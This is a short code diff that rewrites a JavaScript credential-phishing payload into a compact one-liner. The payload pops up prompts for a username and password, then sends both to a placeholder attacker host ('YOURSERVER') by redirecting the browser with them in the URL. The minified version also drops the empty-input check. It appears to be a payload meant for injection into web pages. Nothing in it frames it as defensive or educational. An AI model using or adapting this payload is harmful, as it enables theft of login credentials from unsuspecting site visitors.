@@ -1,7 +1,1 @@
-const username = prompt("enter username:");
-const password = prompt("enter password:");
-
-if (username && password) {
-  const url = "https://YOURSERVER/?username="+encodeURIComponent(username)+"&password="+encodeURIComponent(password);
-  window.location.href = url;
-}
+const username=prompt("enter username:"),password=prompt("enter password:");location.href="https://YOURSERVER/?username="+encodeURIComponent(username)+"&password="+encodeURIComponent(password)
